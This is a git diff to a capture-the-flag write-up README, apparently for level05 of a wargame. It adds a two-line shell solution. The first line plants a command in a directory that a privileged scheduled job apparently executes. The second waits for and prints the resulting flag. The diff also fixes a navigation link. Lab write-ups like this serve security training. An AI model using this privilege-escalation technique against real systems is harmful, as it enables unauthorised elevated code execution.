@@ -8,6 +8,16 @@
 <br>
 
 
+## TL;DR:
+
+```bash
+echo 'getflag > /tmp/flagResult' > /opt/openarenaserver/completelyLegitScript
+while [ ! -f /tmp/flagResult ]; do sleep 1; done; cat /tmp/flagResult
+```
+
+<br>
+
+
 ## Explanation:
 
 
@@ -83,4 +93,4 @@ while [ ! -f /tmp/flagResult ]; do sleep 1; done; cat /tmp/flagResult
 
 ---
 
-[<<](/level04/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level06/resources/Readme.md)
+[<<](/level04/resources/Readme.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [>>](/level06/resources/Readme.md)
